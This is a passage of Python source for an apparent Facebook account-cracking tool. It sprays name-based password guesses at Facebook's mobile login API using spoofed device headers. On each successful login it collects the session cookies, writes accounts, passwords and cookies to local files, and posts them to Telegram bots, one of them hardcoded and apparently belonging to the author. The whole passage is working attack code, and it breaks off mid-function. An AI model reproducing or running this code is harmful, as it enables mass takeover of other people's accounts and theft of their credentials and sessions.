            info= {'adid':str(uuid.uuid4()),
            'format':'json',
            'device_id':str(uuid.uuid4()),
            'email':ids,
            'password':pas,
            'generate_analytics_claims':'1',
            'community_id':'',
            'cpl':'true','try_num':'1',
            'family_device_id':str(uuid.uuid4()),
            'credentials_type':'password',
            'source':'login',
            'error_detail_type':'button_with_disabled',
            'enroll_misauth':'false',
            'generate_session_cookies':'1',
            'generate_machine_id':'1',
            'currently_logged_in_userid':'0',
            'locale':'en_US',
            'client_country_code':'US',
            'fb_api_req_friendly_name':'authenticate',
            'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
            'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            update={'User-Agent':usragnt,
            'Accept-Encoding':'gzip, deflate',
            'Connection':'close',
            'Content-Type':'application/x-www-form-urlencoded',
            'Host':'graph.facebook.com',
            'X-FB-Net-HNI':str(random.randint(2e4, 4e4)),
            'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),
            'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Connection-Type':'WIFI',
            'X-Tigon-Is-Retry':'False',
            'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
            'x-fb-device-group':'5120',
            'X-FB-Friendly-Name':'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags':'graphservice',
            'X-FB-HTTP-Engine':'Liger',
            'X-FB-Client-IP':'True',
            'X-FB-Server-Cluster':'True',
            'x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
            url = 'htt'+'ps://a'+'pi.face'+'book.com/auth/login'
            q = requests.post(url,data=info,headers=update,allow_redirects=False,verify=True).json()
            if 'access_token' in q:
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");kuki = f"sb={AJb};{ckkk}"
                cid = str(q['uid'])
                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                        print(f'\r\r{rad}[{green}ATOM-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{kuki}\33[1;36m");linex()
                        cek_apk(kuki)
                        statusok = (f" {cid} | {pas} | {kuki} ")
                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                        open('/sdcard/ATOM-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ATOM-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
                        stasok = (f" {usragnt} ")
                        requests.post(f"https://api.telegram.org/bot"+str('7179860898:AAEs3yZDMXPfsCCduMWlMTOOoAEKazCMy6Q')+"/sendMessage?chat_id="+str('1778046662')+"&text="+str(stasok))
                        oks.append(cid)
                        break
            elif 'access_token' in q:
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");kuki = f"sb={AJb};{ckkk}"
                cid = str(q['uid'])
                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                        print(f'\r\r{rad}[{green}ATOM-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{kuki}\33[1;36m");linex()
                        cek_apk(kuki)
                        statusok = (f" {cid} | {pas} | {kuki} ")
                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                        open('/sdcard/ATOM-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ATOM-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
                        stasok = (f" {usragnt} ")
                        requests.post(f"https://api.telegram.org/bot"+str('7179860898:AAEs3yZDMXPfsCCduMWlMTOOoAEKazCMy6Q')+"/sendMessage?chat_id="+str('1778046662')+"&text="+str(stasok))
                        oks.append(cid)
            else:
                continue
            time.sleep(0.01)
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(7)
    except Exception as e:
        pass



def m7(ids,pwv):
    global loop,oks,cps
    user_agent = f"[FBAN/FB4A;FBAV/"+str(random.randint(199,399))+".0.0."+str(random.randint(1,9))+"."+str(random.randint(99,199))+";FBBV/"+str(random.randint(111111111,999999999))+";FBDM/{density="+str(random.randint(2,3))+"."+str(random.randint(2,5))+",width=1080,height="+str(random.randint(1400,1499))+"};FBLC/"+str(random.choice(["cs_CZ","en_GB","en_US","lt_LT","pl_PL","id_ID","ru_RU","pt_PT","he_IL","hi_IN","nl_NL"," it_IT","en_IN","es_ES","en_PK"]))+";FBRV/"+str(random.randint(111111111,999999999))+";FBCR/"+str(random.choice(["Tele2You","Telenor","FASTWEB","Banglalink","Sprint","Jazz","Vodafone IN","Vi India","Tele2 LT","Jio 4G","EE","Oi","MtelBG","AT&amp;amp-T","Ufone","Azercell"]))+";FBMF/Xiaomi;FBBD/"+str(random.choice(["xiaomi","Xiaomi","Redmi"]))+";FBPN/com.facebook.katana;FBDV/"+str(random.choice(["M2101K7AG","M2003J15SC","M2004J19C","M2006C3LG","M2007J20CG","M2010J19CG","M2011K2C","M2012K11AG","M2101K7BG","M2101K9G","M2102J20SG","M2102K1G","M2003J15SC","MI MAX 2","AT&amp;amp-T","Redmi Note 4", "Redmi 4X","Redmi Note 8 Pro","Redmi Note 5","Redmi Note 8T","Redmi 6A","Redmi 7A","MI PLAY","MI 8 Lite","Mi 9T","Mi A2 Lite"," Mi 9", "M2101K7AG"]))+";FBSV/"+str(random.randint(9,12))+";FBOP/1;FBCA/arm64-v8a:;]"
    animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
    sys.stdout.write(f"\r{rad}[{green}{animasi}-M7{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[{rad}CP:{len(cps)}{rad}]"),
    sys.stdout.flush()
    usragnt = DEF3()
    warna = random.choice(my_color)
    try:
        for pas in pwv:
            info= {'adid':str(uuid.uuid4()),
            'format':'json',
            'device_id':str(uuid.uuid4()),
            'email':ids,
            'password':pas,
            'generate_analytics_claims':'1',
            'community_id':'',
            'cpl':'true','try_num':'1',
            'family_device_id':str(uuid.uuid4()),
            'credentials_type':'password',
            'source':'login',
            'error_detail_type':'button_with_disabled',
            'enroll_misauth':'false',
            'generate_session_cookies':'1',
            'generate_machine_id':'1',
            'currently_logged_in_userid':'0',
            'locale':'en_US',
            'client_country_code':'US',
            'fb_api_req_friendly_name':'authenticate',
            'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
            'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            update={'User-Agent': user_agent,
            'Accept-Encoding':'gzip, deflate',
            'Connection':'close',
            'Content-Type':'application/x-www-form-urlencoded',
            'Host':'graph.facebook.com',
            'X-FB-Net-HNI':str(random.randint(2e4, 4e4)),
            'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),
            'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Connection-Type':'WIFI',
            'X-Tigon-Is-Retry':'False',
            'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
            'x-fb-device-group':'5120',
            'X-FB-Friendly-Name':'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags':'graphservice',
            'X-FB-HTTP-Engine':'Liger',
            'X-FB-Client-IP':'True',
            'X-FB-Server-Cluster':'True',
            'x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
            url = 'htt'+'ps://a'+'pi.face'+'book.com/auth/login'
            q = requests.post(url,data=info,headers=update,allow_redirects=False,verify=True).json()
            if 'access_token' in q:
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");kuki = f"sb={AJb};{ckkk}"
                cid = str(q['uid'])
                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                        print(f'\r\r{rad}[{green}ATOM-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{kuki}\33[1;36m");linex()
                        cek_apk(kuki)
                        statusok = (f" {cid} | {pas} | {kuki} ")
                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                        open('/sdcard/ATOM-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ATOM-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
                        stasok = (f" {usragnt} ")
                        requests.post(f"https://api.telegram.org/bot"+str('7179860898:AAEs3yZDMXPfsCCduMWlMTOOoAEKazCMy6Q')+"/sendMessage?chat_id="+str('1778046662')+"&text="+str(stasok))
                        oks.append(cid)
                        break
            elif 'access_token' in q:
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");kuki = f"sb={AJb};{ckkk}"
                cid = str(q['uid'])
                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                        print(f'\r\r{rad}[{green}ATOM-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{kuki}\33[1;36m");linex()
                        cek_apk(kuki)
                        statusok = (f" {cid} | {pas} | {kuki} ")
                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                        open('/sdcard/ATOM-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ATOM-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
                        stasok = (f" {usragnt} ")
                        requests.post(f"https://api.telegram.org/bot"+str('7179860898:AAEs3yZDMXPfsCCduMWlMTOOoAEKazCMy6Q')+"/sendMessage?chat_id="+str('1778046662')+"&text="+str(stasok))
                        oks.append(cid)
            else:
                continue
            time.sleep(0.01)
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(7)
    except Exception as e:
        pass


def m8(ids,pwv):
    global loop,oks,cps
    model=["CPH1869", "CPH1929","CPH2107", "CPH2238", "CPH2389","CPH2401", "CPH2407", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2455", "CPH2459", "CPH2461", "CPH2471", "CPH2473", "CPH2477", "CPH8893", "CPH2321", "CPH2341", "CPH2373", "CPH2083", "CPH2071", "CPH2077", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH1923", "CPH1925", "CPH1837", "CPH2015", "CPH2073", "CPH2081", "CPH2029", "CPH2031", "CPH2137", "CPH1605", "CPH1803", "CPH1853", "CPH1805", "CPH1809", "CPH1851", "CPH1931", "CPH1959", "CPH1933", "CPH1935", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2139", "CPH2135", "CPH2239", "CPH2195", "CPH2273", "CPH2325", "CPH2309", "CPH1701", "CPH2387", "CPH1909", "CPH1920", "CPH1912", "CPH1901", "CPH1903", "CPH1905", "CPH1717", "CPH1801", "CPH2067", "CPH2099", "CPH2161", "CPH2219", "CPH2197", "CPH2263", "CPH2375", "CPH2339", "CPH1715", "CPH2385", "CPH1729", "CPH1827", "CPH1938", "CPH1937", "CPH1939", "CPH1941", "CPH2001", "CPH2021", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH2333", "CPH2365", "CPH1913", "CPH1911", "CPH1915", "CPH1969", "CPH2209", "CPH1987", "CPH2095", "CPH2119", "CPH2285", "CPH2213", "CPH2223", "CPH2363", "CPH1609", "CPH1613", "CPH1723", "CPH1727", "CPH1725", "CPH1819", "CPH1821", "CPH1825", "CPH1881", "CPH1823", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2025", "CPH2207", "CPH2173", "CPH2307", "CPH2305", "CPH2337", "CPH1955", "CPH1707", "CPH1719", "CPH1721", "CPH1835", "CPH1831", "CPH1833", "CPH1879", "CPH1893", "CPH1877", "CPH1607", "CPH1611", "CPH1917", "CPH1919", "CPH1907", "CPH1989", "CPH1945", "CPH1951", "CPH2043", "CPH2035", "CPH2037", "CPH2036", "CPH2009", "CPH2013", "CPH2113", "CPH2091", "CPH2125", "CPH2109", "CPH2089", "CPH2065", "CPH2159", "CPH2145", "CPH2205", "CPH2201", "CPH2199", "CPH2217", "CPH1921", "CPH2211", "CPH2235", "CPH2251", "CPH2249", "CPH2247", "CPH2237", "CPH2371", "CPH2293", "CPH2353", "CPH2343", "CPH2359", "CPH2357", "CPH2457", "CPH1983", "CPH1979"]
    uax = f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+"[FBAN/FB4A;FBAV/346.0.0.29.119;FBBV/335950308;FBDM/{density=2.325,width=1200,height=1854};FBLC/ru_RU;FBRV/336982524;FBCR/Beeline;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/"+str(random.choice(sm_mdl))+";FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
    animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
    sys.stdout.write(f"\r{rad}[{green}{animasi}-M8{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[{rad}CP:{len(cps)}{rad}]"),
    sys.stdout.flush()
    usragnt = DEF4()
    warna = random.choice(my_color)
    try:
        for pas in pwv:
            info= {'adid':str(uuid.uuid4()),
            'format':'json',
            'device_id':str(uuid.uuid4()),
            'email':ids,
            'password':pas,
            'generate_analytics_claims':'1',
            'community_id':'',
            'cpl':'true','try_num':'1',
            'family_device_id':str(uuid.uuid4()),
            'credentials_type':'password',
            'source':'login',
            'error_detail_type':'button_with_disabled',
            'enroll_misauth':'false',
            'generate_session_cookies':'1',
            'generate_machine_id':'1',
            'currently_logged_in_userid':'0',
            'locale':'en_US',
            'client_country_code':'US',
            'fb_api_req_friendly_name':'authenticate',
            'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
            'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            update={'User-Agent':usragnt,
            'Accept-Encoding':'gzip, deflate',
            'Connection':'close',
            'Content-Type':'application/x-www-form-urlencoded',
            'Host':'graph.facebook.com',
            'X-FB-Net-HNI':str(random.randint(2e4, 4e4)),
            'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),
            'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Connection-Type':'WIFI',
            'X-Tigon-Is-Retry':'False',
            'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
            'x-fb-device-group':'5120',
            'X-FB-Friendly-Name':'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags':'graphservice',
            'X-FB-HTTP-Engine':'Liger',
            'X-FB-Client-IP':'True',
            'X-FB-Server-Cluster':'True',
            'x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
            url = 'htt'+'ps://b-'+'api.face'+'book.com/auth/login'
            q = requests.post(url,data=info,headers=update,allow_redirects=False,verify=True).json()
            if 'access_token' in q:
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");kuki = f"sb={AJb};{ckkk}"
                cid = str(q['uid'])
                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                        print(f'\r\r{rad}[{green}ATOM-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{kuki}\33[1;36m");linex()
                        cek_apk(kuki)
                        statusok = (f" {cid} | {pas} | {kuki} ")
                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                        open('/sdcard/ATOM-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ATOM-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
                        stasok = (f" {usragnt} ")
                        requests.post(f"https://api.telegram.org/bot"+str('7179860898:AAEs3yZDMXPfsCCduMWlMTOOoAEKazCMy6Q')+"/sendMessage?chat_id="+str('1778046662')+"&text="+str(stasok))
                        oks.append(cid)
                        break
            elif 'access_token' in q:
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");kuki = f"sb={AJb};{ckkk}"
                cid = str(q['uid'])
                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                        print(f'\r\r{rad}[{green}ATOM-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{kuki}\33[1;36m");linex()
                        cek_apk(kuki)
                        statusok = (f" {cid} | {pas} | {kuki} ")
                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                        open('/sdcard/ATOM-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ATOM-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
                        stasok = (f" {usragnt} ")
                        requests.post(f"https://api.telegram.org/bot"+str('7179860898:AAEs3yZDMXPfsCCduMWlMTOOoAEKazCMy6Q')+"/sendMessage?chat_id="+str('1778046662')+"&text="+str(stasok))
                        oks.append(cid)
            else:
                continue
            time.sleep(0.01)
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(7)
    except Exception as e:
        pass



def __FILEX__():
    global oks,cps
    ____banner____()
    dfile = input(f'{rad}[{white}🔖{rad}] {green}EXAMPLE {rad}[{white}/sdcard/BITHIKA.txt{rad}]\n{rad}[{white}🔖{rad}] {green}INPUT FILE PATH {white}▶︎ {yelloww}');linex()
    try:
        dx = open(dfile,'r').read().splitlines()
    except FileNotFoundError:
        print(f'{rad}[×] FILE NOT FOUND...');time.sleep(1);__FILEX__()
    dplist = []
    try:
        pass_lmit = int(input(f'{rad}[{white}🔖{rad}] {green}INPUT PASS LIMITS {white}▶︎ {yelloww}'));linex()
    except:
        pass_lmit = 3
    for i in range(pass_lmit):
        dplist.append(input(f'{rad}[{white}🔖{rad}] {green}EXAMPLE {rad}[{white}firstlast-first@12-ETC{rad}]\n{rad}[{white}🔖{rad}] {green}PASSWORD ➡ {i+1} {white}▶︎ {yelloww}'));linex()
    __METHOD__ = input(f"{rad}[{white}A{rad}]{green} METHOD M1\n{rad}[{white}B{rad}] {green}METHOD M2 \n{rad}[{white}C{rad}] {green}METHOD M3 \n{rad}[{white}D{rad}] {green}METHOD M4\n{rad}[{white}E{rad}] {green}METHOD M5 \n{rad}[{white}F{rad}] {green}METHOD M6 \n{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n{rad}[{white}🔖{rad}] {green}SELECTION {white}▶︎ {yelloww}");os.system('clear')
    with ThreadPool(max_workers=30) as BITHIKA:
        ____banner____();total_ids = str(len(dx))
        print(f'{rad}[{white}🔖{rad}] {green}TOTAL IDS  {white}▶︎ \x1b[38;5;38m{total_ids}{rad} ! {green}METHOD {white}▶︎ \x1b[38;5;38m{__METHOD__}')
        print(f'{rad}[{white}🔖{green}] TURN ON/OFF AIRPLANE MODE {rong}✈{rong2}✈{rong3}✈{rong4}✈{rong5}✈{rong6}✈{rong7}✈' )
        linex()
        for user in dx:
            ids,names = user.split('|')
            passlist = dplist
            if __METHOD__ in ["A","a","1","01"]:
                BITHIKA.submit(__MTDONEE__,ids,names,passlist,total_ids)
            elif __METHOD__ in ["B","b","2","02"]:
                BITHIKA.submit(__MTDTWOO__,ids,names,passlist,total_ids)
            elif __METHOD__ in ["C","c","3","03"]:
                BITHIKA.submit(__MTDTHREE__,ids,names,passlist,total_ids)
            elif __METHOD__ in ["D","d","4","04"]:
                BITHIKA.submit(__MTDFOUR__,ids,names,passlist,total_ids)
            elif __METHOD__ in ["E","e","5","05"]:
                BITHIKA.submit(__MTDFIVE__,ids,names,passlist,total_ids)
            elif __METHOD__ in ["F","f","6","06"]:
                BITHIKA.submit(__MTDSIX__,ids,names,passlist,total_ids)
            else:
                BITHIKA.submit(__MTDONEE__,ids,names,passlist,total_ids)
    print('');linex()
    print(f"{rad}[{white}🔖{rad}] {green}THE PROCESS HAS COMPLETE")
    print(f"{rad}[{white}🔖{rad}] {green}TOTAL OKS  {white}▶︎ {green}{len(oks)}")
    linex();exit()

def __MTDONEE__(ids, names, passlist, total_ids):
    global oks,cps,loop
    animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
    sys.stdout.write(f"\r{rad}[{animasi}-M1{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[\x1b[38;5;38m{'{:.1%}'.format(loop/int(total_ids))}{rad}]"),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
            netheni = str(random.randint(20000, 40000))
            simheni = str(random.randint(20000, 40000))
            cban = str(random.randint(20000000, 30000000))
            user_agent = DEF1()
            warna = random.choice(my_color)
            adid = str(uuid.uuid4()).upper()
            device_id = str(uuid.uuid4()).upper()
            family_device_id = str(uuid.uuid4()).upper()
            advertiser_id = str(uuid.uuid4()).upper()
            data = {
                "adid": f"{adid}",
                "device_id": f"{device_id}",
                "family_device_id": f"{family_device_id}",
                "secure_family_device_id": f"{advertiser_id}",
                "access_token": "6628568379|c1e620fa708a1d5696fb991c1bde5662",
                "sdk_version": str(random.randint(1,26)),
                "email": ids,
                "password": pas,
                "sdk": "android",
                "locale": random.choice(["en_US","en_GB","bn_IN","in_ID"]),
                "generate_session_cookies": "1",
                "sig": "c1e620fa708a1d5696fb991c1bde5662",}
            headers = [
                "Host: graph.facebook.com",
                f"x-fb-connection-bandwidth: {cban}",
                f"x-fb-sim-hni: {netheni}",
                f"x-fb-net-hni: {simheni}",
                "x-fb-connection-quality: EXCELLENT",
                "content-type: application/x-www-form-urlencoded",
                "x-fb-http-engine: Liger",
                f"User-Agent: {user_agent}",
            ]
            url = "https://a"+"pi.face"+"book.c"+"om/a"+"uth/login"
            buffer = BytesIO()
            c = pycurl.Curl()
            c.setopt(c.URL, 'https://ap'+'i.faceb'+'ook.com/au'+'th/login')
            c.setopt(c.HTTPHEADER, headers)
            c.setopt(c.WRITEDATA, buffer)
            data_encoded = '&'.join([f"{key}={value}" for key, value in data.items()])
            c.setopt(c.POSTFIELDS, data_encoded.encode('utf-8'))
            c.perform()
            c.close()
            po = buffer.getvalue().decode('utf-8')
            q = json.loads(po)
            if 'access_token' in q:
                response_data = json.loads(po)
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");kuki = f"sb={AJb};{ckkk}"
                print(f'\r\r{rad}[{green}BITHIKA-OK{rad}]{green} {ids} {rad}: {green}{pas}')
                print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{kuki}")
                cek_apk(kuki)
                oks.append(ids)
                statusok = (f" {ids} | {pas} | {kuki} ")
                requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                open('/sdcard/BITHIKA-M1-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/BITHIKA-M6-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                break
            elif "User must verify their account" in po:
                cps.append(ids)
                #print(f'\r\r{rad}[BITHIKA-CP]{rad} {ids} {rad}| {pas}')
                open('/sdcard/BITHIKA-CP.txt', 'a').write(ids + '|' + pas + '\n')
                break
            else:
                continue
        loop += 1
    except pycurl.error as e:
        time.sleep(10)
    except Exception as e:
        pass


def __MTDTWOO__(ids, names, passlist, total_ids):
    global oks,cps,loop
    animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
    sys.stdout.write(f"\r{rad}[{animasi}-M2{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[\x1b[38;5;38m{'{:.1%}'.format(loop/int(total_ids))}{rad}]"),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
            netheni = str(random.randint(20000, 40000))
            simheni = str(random.randint(20000, 40000))
            user_agent = DEF2()
            warna = random.choice(my_color)
            adid = str(uuid.uuid4())
            device_id = str(uuid.uuid4())
            family_device_id = str(uuid.uuid4())
            advertiser_id = str(uuid.uuid4())
            data = {
                "adid": f"{adid}",
                "format": "json",
                "device_id": f"{device_id}",
                "cpl": "true",
                "family_device_id": f"{family_device_id}",
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled",
                "source": "device_based_login",
                "email": ids,
                "password": pas,
                "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                "generate_session_cookies": "1",
                "meta_inf_fbmeta": "",
                "advertiser_id": f"{advertiser_id}",
                "currently_logged_in_userid": "0",
                "locale": "en_US",
                "client_country_code": "US",
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d"}
            headers = [
                f'User-Agent: {user_agent}',
                'Content-Type: application/x-www-form-urlencoded',
                'Host: graph.facebook.com',
                f'X-FB-Net-HNI: {netheni}',
                f'X-FB-SIM-HNI: {simheni}',
                'X-FB-Connection-Type: MOBILE.LTE',
                'X-Tigon-Is-Retry: False',
                'x-fb-session-id: nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group: 5120',
                'X-FB-Friendly-Name: ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags: graphservice',
                'X-FB-HTTP-Engine: Liger',
                'X-FB-Client-IP: True',
                'X-FB-Server-Cluster: True',
                'x-fb-connection-token: d29d67d37eca387482a8a5b740f84f62',
            ]
            url = "https://ap"+"i.face"+"book.com/au"+"th/login"
            buffer = BytesIO()
            c = pycurl.Curl()
            c.setopt(c.URL, 'https://ap'+'i.face'+'book.com/au'+'th/login')
            c.setopt(c.HTTPHEADER, headers)
            c.setopt(c.WRITEDATA, buffer)
            data_encoded = '&'.join([f"{key}={value}" for key, value in data.items()])
            c.setopt(c.POSTFIELDS, data_encoded.encode('utf-8'))
            c.perform()
            c.close()
            po = buffer.getvalue().decode('utf-8')
            q = json.loads(po)
            if 'access_token' in q:
                response_data = json.loads(po)
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");kuki = f"sb={AJb};{ckkk}"
                print(f'\r\r{rad}[{green}BITHIKA-OK{rad}]{green} {ids} {rad}: {green}{pas}')
